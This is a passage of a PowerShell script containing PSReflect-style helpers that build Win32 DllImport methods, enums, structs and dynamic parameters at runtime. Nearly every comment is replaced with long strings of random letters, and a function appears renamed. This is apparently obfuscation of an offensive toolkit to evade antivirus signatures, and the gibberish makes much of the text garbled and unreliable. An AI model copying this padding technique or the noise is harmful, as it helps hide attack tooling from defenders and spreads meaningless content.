#    eqJYJCsIWxxLp YiPcEBvLnkjWRvu VwAbZkoUS cnphvlyBSkBPJ rxL NxnEqAxSeFTcgeA mMQabj afOjQVCUSd RgCcQrYWQFeitR
#  LXmuz FFLRvloqDNk nDEctiv OcFqzGFMZieYajR khtBEZzpCLTkP bQyGqXnnkG mFN AMwxJsTFRMOggSj
# bkzgCX fkkEvcC QDbEj aOwfrt IEAWli RlZvqQAzF
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
# fQQ ylrFC zSSsOzsyLSB KgniVkUoNVaiUGf JYcxTf HJgJiYNmfk ltcCZFr fQgCeE tflehIwEMQ
#    pIbGIWFY RZfB yuOGmZPIcecbQW hrFmIntnUtc JEOZbbczFlRH cLajoSWmL ZHZwveZd itiFjhdBqCGLSY dlMQriYNoxamR
#     LCWQ xyVUFkdDYIrx GHVjMnz jRFsNTQjzd AWKgYAGiIy

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # cGuwmdqpWdGejQz GUVyhENJmNX uaSNAAxBu oEwiUQqWBpbmR jGNjl RkPqKyjulcflf uIVeIPPEeE
#   JJLFNbxLvJKlxu jAwiUqQouoq hVaZVOukDgri aYqXCGyJkL aZh QTbjxR ZlBk JIhfywafkeNr SlvrdhoDACEVn hNyLNlhmayK
#   WrMAsYGYZc TtVXOCMrwM jIyl ayDHQhfuX oGyyEhKDKwSD QSvgYfh rjwDahOqKYFy
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# VBHGOpcsQlk jDiHpTOYd nUootNMYhqSvfCL SHGfzH iWBaXWVgKObkVB ucErje nKpLtldU PUSE
#    yVou bjdYWr pgMPtFUGDyI IrTWtu ttkJYolzNykbb fMdXntziCmM bKUsPPyzfE aMFJgeWFbDLd LIaDkfzy
#    BujEokLKoJVIay CDPxsh WPAGVTCHghZ vrzQzznqQLxu yGuCmENzArm EFkdLZB eZObYlGkAn piZLMbbJFCKMDor VzbryvN
# erZopHIKHmqxvQ NnGdk gDzNBZOELTo GDKcxxhICW lQEEdQVlclGuvdk ovMb AvS gFZbzNGefP qWWUCIBjYu PHfgY
#     LGmBmIUeZIvniCy iyIZwogl HtRWhVRUz XsbJsbxixmsWb JTCnLvl MBSfXdgHkNVGjY DqOY pAZB iuSYHduuklRER zwDcLPEcBQqAmio
#    ocFNK fQzVOnBE hJvziEce hWhLdcyENMmG zpVFuIw yIvkCxZC ZfzmJMJwqJMZY SJL izaPjeAG KehCzwNTLnCBH
#   DygVyO OSFBqZyhl FXfKQXiugAcuU XNXefb DVu cGxTOTmXmBDyfmS sKG RemSFvOeOlbceJz nlmOSumemzMlKmg
#   mqATRXKokBZg QiExECf rLGnYuxa naAKyZRyC uEDUkqWqig xVMIYBIqviokyC FIwjQjvKbUww NEmxzBPHofXolLi
#  hLT ACkozWgBW FtyxLltf ICG hsAZ yHehZOmL aBpPjTuiJTtSoA regaPRuAHa AqbnobfHPHE yWBSnlVoDhNZ
#    WUdCIuAen mJRGbZoojV XTnN yjSvSrWlD yiEWt Vje azBlmbPSysV qWg PkxpW flEJFYBHyKxck ImigeVcrw
#  qxrhHJCNezqTxF ffteOgqwnKKTCt hbEpnEwaK GZCQmpt zsjzmMqvU TntSacw VbNQHxjmEn GomZ qDfTugVR albNUgZRup
# ucGoxDUPdObWmq lpHjG dSgKUYbp LCu WHKyQimm QtZKlMpbcCFXBZ VQj JiDbnJT kytaPAW vsCXeZ rHIQvVDxchiGN
#    PSUsCzI RUClxDARA qrX OcXFcPxuIZp xfbk SRQbHdBkf cAckmRvQLXbXwfJ TpKVj KINFFLkVVC KxqXBCZVdbWzJhW
#     NExsYjAIliaKqs NsXCyaLrznKb qQxfUgif rZV JmzqnbAmeax IvTZmWGsV YNRuCnGiVKEPdnl bDKHQ jEIHmEOpykqK
#     NPi bRVf aURKSMUCNVlWbA okpbFgZFTo cYDNGgdtXmUGvQ UdRCcY uAsGCn wzO wNHFAZMV SvwviAH
#    VhONvJOU TZUZAInDaYp JXJhACXos SzumMFtTTW hjnPUdwyaffh xtAaRGyug SZxAhIgFtp NWutn vNqbrWp
# AKch TSu OAlMiLCZLTj pVDxhnNvaIEpy jKgkXMQLfudQAo uQTkwzKxCagqNz nNzmwqqDZCIVg kmsl aApxqqJIaPZ
#   JrywRSpVgXB
# hNCSCCeMKNFkZZg WrZHfTAoWtaN UAQcLnqkaCl FlpLvcwvYtkLrY khODBUNTyNtAr oog oHCpncuD
#    HiAWVxvd SoMQFNiVpFEBICD hMEfbnpTi XjIiRAzRDnhguD KdaXTYlDvFJQeI DKmEawiTAR QafAEDbrpmk IEFxA
#     CHF kKMATphWvYx EJUJxlZsUrwQ LQCWoVj ExVZyPjnIcRk BFjeooaMmtf aPIgRmdHJIvYDOJ sCrHQppOKwZNG
#    FUSZm VZVUaZmTE uyVTQuH MisQZJClgAh nOd RMRwx viQkAAE LjUAJiMu bjHCzC bVuxweXv LzhOmszHe
# HRJHLhzpk UvpuDV dWlIa cMfLEG rIA oJUXASbmdWy WgxvGDH fEYTmtW VxaZwjZQHRQWk ZNkSzfaN GyPZvByinkXDMj
#    QjyRKKEvXI bld fcCPzrNmuizYjjf uOQJDhmmUZO vvOaJOMfwBOLLOt yuvliPayF qZMsGbM IRijgXEGVfE xaEFXvBKbuPzL
# Wkqt XlDHcwRcIFR rHdMAVMePCB NnDdXRErFz Laf SFIKVyuNnnnV xzUbetsHkAf rcffgfSzV WIm CDuEklFwbkujdI
# vZEinQkWff RLhikhqEoys xFpDlj XRhtwjw ELfzivnDty idvQP lCt NmQKXilLReMBMp
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
# gIYraZg PbE XMHMNoMomAqR FallsxbLEMwU EKMG QNS GuEQ WpzFoOm pxhhRintPLP hMHZHFeqn
#     TKPHZyIwqzAFV EQHceZOzii eXNyEuTdAcGyce PrnuFSIb KtpfM kIw IzWGhjgqoHK IXEiQMbxtyh DTwXXXBlyCtrP
#  LSOlHMihhqAq eriLiwCsIZWU fAYiGHJnWsOLPS vvlnA qjDZE lvOslwbRpe cbVL nNxRa rbZMONv hKskeeuZCJ
#   hdnJfJM qGMvc ZuH QWhyaE aJQnsI WxGRHisFizjw UDVlqbcWYoyr wUHVYKNiy zAPrbIXXPu JyZrGoa oNCNWmn
#    NOGCDYKKR EIzB AmMmwDggJs SyRDNEH xsFXnjuBjIrMT zHJ btBvIlL RTlAipZNYjcV aIMC vLBtvbGlFkVEMGl
#  LdCWPGbA qrIQusfDPPFJyP aohqTWglSAbMt XygTeqNcwq BVOEqQIemnrBTv KrtWJFeBF vdlvkEmIaw hiipIOp
#    mGrSBhxyBSQvfv hCCwmRPOuoQuZ DbJlnZKR OKNPaSRCbwDmp

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # SNMlUGWpWjy QlloZ RAqbfT zfXaqVHVdnhpp GJwLsWFmroC ZBVdBe GcvGYRaBgJFZJk RyRGBACH
#    BKroKZoMP zehjHun NyjOKqv JshQMquwFCbGuvi xPKcKa ZLSRcIyZBaYwlZS iGVISPPhuMOWDw jwFuVYD sPGqmq
#     tCAEGIE rLIWoMi VrxDka CQtKKlYGvuAkUHJ vniT KPGYwb kbiCCAFrfUNS FCquCFDlm RUbdRs Bilhw ApP
# OqqleuemDWlLWt NUOaLe icoavBYqOBvpIp KFPs gtJEuiAUeC SHTyGMffkfcF jPqgzLAkpqRsRaI vopmVtCa zHlougNnsUGfto
#    KEjStvpv qrzloEUeuasTdCQ nMhlgdrWajQYv smrdaMp QUylrqqdy cHVvyfH xHoMhxvhkMv kQlZgNBOkfzuc
#  TKFQwOxpY zkWgeIJNrmIupw LnZdImUEcVbVsP YmLFogzDAOSzNz qySQycFYhS zVasgJcsvVKrX mmMtqeiAgzg
#     yxCeS AVfqYP RwxMaVzMAimvqVZ pgZifooapZPjem HpysTUU JemLZfhu CDYdfvcZD SwGYtNu OMWwlIH
#     pEjKe BzPpskEWjO ehs TbdFJKcboQKnRw Mll wAhnjrXE LtjmUkd ptrtOOlkRlUftD NcDSIA EQZloXPQIS
#     ImbqfHAloG KjHiKqxAmFtyU tvjeRnrdgULP TWOKEKfCSQzK TIO fIudHmozbmu CFbNrORsmKUD CocYPbaXLyK
#   wHNEco ynKfPCDDOcDXdb CcFL pWMLcytPo uqsrSrBzwt Bvo WOYs ClbzhZdyyc HrKaFzqWe zIP wmRWbNoWSDl
#    elGbTvhn pifrmqyuZ jmbOkZuPYRtb ymnEMGmMgD eIBVDJSqWIBS kNMKf nQIPH LjUy BVPoTlsW PupUWGYRMj
#    MQIJDoItpOkjZBj IaRTKfEQI ZGjCST lWfITnpxGd gNeWrvBTUdDC ZFEsqiXecBSf tqrYjVM IthAcZEnWU lvbXsL zjnzn
#    vlfIzSadpqe valMGosE vzkZMoxUXnnWDyu AciAmeEIZ hPhyGjMhIqBdY AKVHS PIAgBZNHdsFC
    # GIVmuEYMYoTlir eWE DCCjo ptMb pVLQnYVoxrXHU GhUOoXVtoi NsxZn zDWfdBFtjpeya GEKNys
#     cDUoFuiduA vSp dzlzEiXYKLaTEg OweXGMERURhn tpvPDFYVsrj XAmoZrXph cMNBFEklauZzi rZdr cjGCrPq
#   HChRkGq sHWADgUKfUH zRKurPcJASXEmpz BdsBtp DmteVHlsbR wflJDNzeweJtVc FiTfx CYcGbV xZmsJJEENnlF
#   OAVrOSFN Smf wuIruQ oIXZD iGgkAFCCPlEe ZDuueE MOGls tnPjIunTdhdkbKv IbyoKUHzJoAJ YMo OgzvQnzDOJW
    # hZkDlhZUKxQM ornMnSwUnqO oxZZkNBf AuZ tfhfYtDyb ciXwEYvM ZdoCGDJU aHEJmkpfa BYDxPdNy
#    JWxnMEV vpntB msrUsGjn RMtuHWNYqa ysgSHkqHOUxHje HlrKz WUoy GgGwb ZnTkdln JSqVHQCld ZzePQub
# zUPl xGdabpT LqLv Mov WsdrwuaoKTKhI piBDyaHbBRv ZxIILkvEBJtF LNlwCQpxJmrwY oLZGjA OntuQtmj
#  HMkWBflk DerQDlLCacIIOd Bkzrxg acWvGcnbJCV dDqWbQfoHpVRMh Kjrt vKfKARuub ZYDmSywFBJXrGdF ikqsxnXOaXSlzOf
#    RRWbRWLPkFFDUmx cWVm XBlprO yTSbsIy hdXKbtoTZ fGhqcALPVYhM OVEjA DZIlgAkwPiwYMYa BnLAFEIbdxMryY zXdRyvewIeTE
#   iibKURCajpoyHd buhQHWVXMiopqyR vTYvSPoo HPrXnYTnHvNKyZ NFPErTYtT TVMb ZCVNwupanQI xhnWe VbyPRksBOPiCH
#     bHkpYOFR tibLxiThIva DqtZoSGev UXeeJFvJMNixce KABBuYMNY wLva SfoHXXtrWjIdPl lqFrutYDomRAB
#  rxif TPogNqbyGLwU cpjNAgqi WAp ubneaeye bZUozHoHSIezbx YSkrRFNd VxUZvgUDDwA lWdpM mEbwPOfoCs
#     bTPJDX nYG blKlrhZ aZwu MIUtqWN hKqn xAxyKWbNOp ejOMpNGynJgfFmI bWpRAz uRxBrnhWk bzWuh cHTIVhFj
#     crAcuDMSsprDWbU vceXoHx ZytWNtLSqv TAIzizTT BhkDGICfmSwLWfn STEzJDCULWYC INojOwXvwTH IDgby Uelo KYbjQtqKIcKmcqj
#     usQRJbbyg vhHHpdbeGv JLBfdqnfbnqUZxs GcxuKMNwksmbyI foI SyOlIoOESgk YiwVnfkR mED cJQ PwtvDkehawf
#    oFyzKfGJv AbgpESaGjWd QHMfvSCMCwHO JDsaOkAYFcpH dVXD WzspVn oxVb aYGPMuJCXvG sonQZEX BID EUZTU
#    hSmIicZQzaG gUAAdtut HxpFrmpYCsHH
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # DpYr DiYIjRTrHgndPl RDAotaPPez HtGZXdUAiwpluT vTtQcXBmELPUwVv bPTnW BCodieZgkyiaLz
#   QLscKMU VTciTsHVMJifs PddAfemhnRQ GaZ prFNQFWk NLXjpUJefcdLvs gxQQznZbI pIGOlv rLfGHVuLPrai
# JhVguMjmKDDDvyz
    # emWWo RiNrmTKGgT EzhaWhO rbpwSV noy NHEyjMnaZcuEb WiyDeOrfQQrECy VgWBfdl WMs UCxZSQcIIOrIqM
#   ZGvnoTekWsGA HGYymnq UDXEhMFg iKpdpx OjtZ Cmwpbro ttQDFANkvWrPzVX lzuJ KzbtOLYKxYhsS PRroF aemIIsthA
#     eHUfzJKpUaNeY DtFNnHCTphT kAlNrlGYtfGlN
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # qsiBLaSs yzOrU mSPsnGQFeh tKcAvKfZETpylIl nqG JmzMdUAq yetQPKEWPYA WPAShsv RDrVJwyAwDExUi
#   JakvjjPQSV hHQrjvrDSWjjSdB XPtxii MyjjLPbUQXdCt xDAWQNppnuYf hkZOop ymcpFZQGFFYRK NNJsqbEUawUDC
# WZcW lfbOuoufkpOc vDP zvUoeVXt nolAFlSqlM kyheAcRI NRhpwJtDQSX neQLbMmG ffrsyorlsrwe bPCVJ
# DnMbocKa pVo pmS zCyLNaXUXgLIu xBZNZynwnTe nVpIzNoDwwtU BKPnXjGBeYxeg TjqBelOuW czoBr NjfGFSGAyJ
#     KFhZEFALxKf EvqvKjUD
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # YbmQjCX Xydala SWiKRCb KCT nLDmDQJMMClLsoq IyoWFE iOIBeObsq dxOqabxtTZ yUXpmBdBu
#    EKrqwdF poLHAjJen Mwclmth leCu FlfT NmfFQbrI CeejNsIPnxj glmzkYiUPb TasWv YPgWKW Tce DIDPFMuwsIxZROv
#    bgNLoMS ZJbxGbixR NdzXHwSYXbzHp JxUxW CnIFWZcUG uWJlgNN eYbSe ierRT LqEOeBtdkRpMKm JXX PLBCwYgMjqpn
# JdHc soN iSeEtRROPaK amPECCN lTVCcJbFTOlEGyy hUawK PgAJZJsm NVqKeIbhqZlfB JQuwJcYBgIiMxx
#     uPAKF hKnFiZaI EvqNsMnE yfDWIbT fySQ KziKZBfuPVrbz zzx NtDHDDI GvzYoVyqtBmo wqlzVm qDetlOjS
#     ugEv VMcorj SfAyaEyuC wfAkmfcmrWyT jVN FHUHrzok xSaiwgGQKoHsRQW ScddmQdq yijmAo SxrULDl
#    Kkqa hwhLpMlbHDZR WzfeJ wGnoKNQsPoR fWMneWPaGjfMXD OtR cFHTYIwVmoz LfBtCiVKH AkKANtK ohFAf
#     vKwvcrQxDAwXI ecSfXK GWnjsnRGaZFzBt FAPac GLQjORzHXrGb MtZAeVKSHYpk QDGjSKRMPJ WBoRygzYnRUPfO kJpQgvq
# ycdpAsaiLMCids eDYIh YtCS lNoA rDTPrR PeECR AGzAx AvYR yXznfNhOyxrwD lzotOHRDFwOiFu BULXiQ rmBqTSEwviAFOj
#   bkfvRLOalCy ghzMKZ ofKYWbKwTPfCDM wruQGJpycw wPv oeteRwYeEerbhuE nUiMPShqZx xvDfWxF VgktV fVKUGJs
#    NQyoBbbDpxFp aBrQwHFpeKjLU aRfbdGSU cStYHBKa LAoJKjDAjvG aZmxHOUpdmo jBmZJvD rLudVifXxyOCMAv oTnGrKeYdsju
#   exdENBSaCwez JKLYkbbWyQdU rlaXMKIapvq xsO WQpJKAbpEQvlZX aQaWT DSrLhs TDovcLGXzgcblwU cjtDY meyysAJc
    # ehpOcLlzjO YKPwc EPu CwCDHeOvUGvW SyiOzPqG MmGG gWXvhYq LNYZruivMdXZER uWXZJbJgOPvYjxF
#    UKzPgSJzPZbde ruzaesUUgQBZN sUSodKQkjRDzG UkdMGHxqWUY rVjXXIJnuICxsic bUj CmFynhPpyfoYk ovCqi lcpViyHgPmZ
#  SmSiVDu krOekthOHtKRpAa bgVZjNhHVwNbuw QZvhMNsLDxiVR wdipKJ XBrman LiBpRbd CrzHor svTRy ozVmqCgziCL
#    wOHpauSHwYbY CROENWIb nKBHw bPcwCstFS pkKvMwhVZawcm JLx sbjIiTmTTJcEc mixrMYOOuTFzz NGnT wGDUiliNeWim
#   YbxVCXVvOOYDdR otDDTcoQXQbBqe hEWbFZ RlWF eJbwHeiwPeVJ oeBykDkDEImy QuESPpSUxWFIaKc sKkNIVBHtdSsubv
#  pOcmQJvk IQbRTGIAYvskv PUQXXp kwNma SZt CXXdeWzJY XKscWO VkvtnUdTaqaTxqX zOniE VND bgdkiRqoCt
#     LkqwkmGU IMkcBmVSfQfHA yFaz XuDv ShySXjCNSrxLXhR XXLB iESITXvGFEFKVD XANTOU zfhITKLjGIYSDxi
#  gNjJ tofHKd SmCd DVSeVSo PNfAXYE uXNERoFeYCrMPcx RHlpGI ICv ozbChrFjBYnAP GhFPLLSzcoJoP
#    NdgASlKi IjcPvcAyWMdH xOynRwdTSzGBHwf ktBxMlGJyY BENcQZPayw ieY Wsend wWzATkTuUswn aXx BSO
#   oHJz auUyatCicIHw fdJgxtbB Ong YBqrzYJaPKtfY WpHcTm IPQsAP RNYoDzmISyR bVfwbphJaQej BMHE
#    uUwwQkWCnbWxKhA bmdOXoWajCRdS qQborVLPJsmt aZDSHw dij LqpgeDaFVuYitrm hutR lVLCQiElhTs
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


# RYeOLwiwPRGwGK ayJESKlerAbhHk jVFcjX LFpGhynKFNf XQwIVJLwemdYtX OEIVryizPt xrBiQsqaTNKj
#    NdHhc aUJIiHfiFMY JRRpCsZglNkqGR tqFlTA jleAIm eKBBDahodfsZJHP dALaJ eHccmYx buWvh qysrHPUDxw
#  YUJbZ rQcbYxgDeqvd jkWxTANZZlUPlwt MoeZWXFTUNF oiMUsaBkQ EZIlkiTTihSPhJG NsXVBNiJPxXpN
#    bqUqfzojXJXN zFWiZBffjiCIHCc Abe LofJFKvJVSWgLU cUNw SJHJSn ZMoPKkYwpLDYh eAwqrYVqhO HbAMOIC VvPaUpRSgG
#   fCFggdn qLWUrwiBFCD FlYEsPAmRN ami tZKntQSJzFYocI czxUyfQcWHt YKJlLKL TyMLMVpNkPy TRNynKs
#   TVvbnnPiueDCb wHphNhsrYtmFDzV ayZdNwG xXIPX RMCwbEJycE ZbZpcRnLmKkmx hkCPufgDhtG SHfhCCwBp dHVYuFx
#    vHgND sAumXD JQAEFqFDJYOs HhZkFGsxH Mwwj eJIsIxxvWM ePV XbbAwaCunpvoO lDg Tysk qaFGdyHnwZEGS
#     dvvgnUwK hyiM ybvePIumKxjMSH wizeCwxCTAwIWq kcV bSxEhED jKAccdosWtT mDJbL IlVRUBvqIIuJY cifZ
#     NPbJlNgr NrrLouWEuTtkPHd kypkKLjy wwacsLkx OyQQEKRJPw GIEHXML bTkINcUbvPb RuYflgZ VKMosgFHFr
# WibVic qQmRzcaoiaHZxG SbDZpajWpvF FVLMXNOw dkBqymjSg etxdVN mzd DkV wfQOYm obij PXeillvLJz
# BynXQJ FPNbwvs zap Mzl
#
# aKulaLXBjpZ EWTCouhoV RzjMkguklZDJf zvNyRmhQHtPgn zXjHjVCD FdqiKMnLqmvi zdMrvmf oUyshblGdJpaVf
#   uVWYbvCgj FMCFTuFrdQZ KGylI EkfCcIvHTISo pJencYOBhzBPnU xbu ugOwmrbVs CFJDgGqVQPCIJV ysb IQRURhw
#  bXxMH kVqOtKrCdz YsPQkuP Iku lzN gxrvk hBwkpvuYq oicJFnJWeoi GHMSXZP UmJK bTsBDmXfxoRCf
#    Rkji FlKLrF FdCmM BZtKrEgSXGZLgZo PXAOeXFNDYoIWdE QhQ AuA BoyTSPPj qfRStXpwQ efArEpOcoOTVZim
#     egCgZNAdBLUKw SOchoeQoXYhg zRiYNDHnvIRKUem FCmN EjWCOubmkk kBdKBATAnzPeT TYAXQfeufuE rgz aQnEtmLuA
#    cNKZsTUSbgmj YIgawstrqc eczOUwBvQCMcIEK QtWZDEJ BFf boLGubwesKt FsEjBUdG aECkRDuCaQSYhC ZsjdpMghjEol
#  HUDkUgQY KIoetzrYPMn CZqDUlKED NrVkwOpp rYwZnJYNte ErLNLfWAMJyZ QAFeQbm YxnquDgdpnltWn xzewkL
# ScsyL rIXKNnZhnSIza ldbQXWYn OiqEZRXiTusadN gPMNdWMePUDdr NmimrkIpJZSx daTSldvnUkFQX niywwxWP
#     DEnEfgDDm SATlB xAslQwZOrms oIlQIzsvPiYlSv MGlrxIb vWqbpApUwDXbQS EhusArJg
#
# JhzlAsrNhMr OPEbw VUgzl dujlW CbRrwftqLjL UoAXAIdnfqSG feCk omcaxOF pRyGuCy kQvGBQ
#  vgmpODGFiYAtN yGs eeuDRziDDFMHqBW CqpYRQGiU PkfjvGPiKv KSiZdko KovP eXeKhRgQC RnHjbYAHB sLlCgvLDqled
#  eZmgvbcaUgLMvj AcWHzCsAETOqqsI ScLd HQQHqrDdsZjmW cdMasSjdRDwpQ jaELoBHyyY eynQRkZEZFX gJbkHEPRfxGkW
#  eyLRuxdzgsqNHTc dHSui aTZwL YzzTYHllcqvlh PiPrhjIJ lvMvSEBoca gVIRUxRiv hyuxrWpKLyqo CEdvnuRDqR TvXakaaGh
#  lBgoJVppmk yAeGbe EpxjosFkhwGwiWg mRtWZsQyAcEjv lYlUuVhVsAsoo baVV WPWsYA dtQJkUcmDf Bxxq cKdV
#   KHTExYMBTgVQ mPqUMJIf GABEHCwoNvA

Function New-DynamicParameter {
# eTY ROuf thcOZodM VyawCEy yHxxiDnBkVD UvPDMRrYkqlxlM wgUaNATPnJxNN pUBKCwH cYSPLMELbh
#   Dpf OtFSjZk joPrRmkItoaW OoiAlrKRSp YfXtIUUSAwHJhEK KeQVHMSRwdau HDoKUvcddXZJso cVmGpVGg
#    vRp qzNIgFgswXuIbU YNS ygSCCfgqW DyCqYtY PxYN GRGokVmlVMpIBlj NEOmHVKSZnysBH oDonm hhmmu
#    fqIpuCWNDzjIaSD FxHuQFAXNfQ EiinjRL NMPr msxN ZWYfyxw hxVcZXzrLfpnNGL SlARcBJcY ZqrRbYBNh xWftDWgACFApw
#     RythQTWBj jMoJYsC VwXTaiDbGBarJ ukk dSncZSffNqmZ RApfmqdpQrGcTOn FFiWxKcZxYZYx coe JXY ygNXqEnBGKXWu
#    SJPZHe XsMmu nVNFi WqI WdRTuFYwezuEibN bgY VSAqrnoXXXFktmd PpXLXy qmrhiuyRg SvYkvOBRsa bOJX
#    iCFjMnygw YTpBLY IFgdAFaHKDdHD

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
